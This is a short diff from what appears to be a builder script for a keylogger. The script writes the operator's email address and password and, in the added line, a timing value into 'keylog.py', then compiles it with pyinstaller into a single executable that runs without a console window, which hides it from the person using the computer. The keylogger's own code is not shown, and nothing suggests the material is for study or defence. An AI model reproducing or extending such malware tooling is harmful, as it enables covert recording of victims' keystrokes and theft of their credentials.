@@ -35,6 +35,7 @@ os.listdir()
 
 replaceFileContent('keylog.py', 'YOURMAILHERE', yourmail)
 replaceFileContent('keylog.py', 'YOURPASSHERE', yourpass)
+replaceFileContent('keylog.py', 'AMOUNTOFTIMEHERE', thetime)
 
 os.system('pyinstaller --onefile --noconsole keylog.py')
 
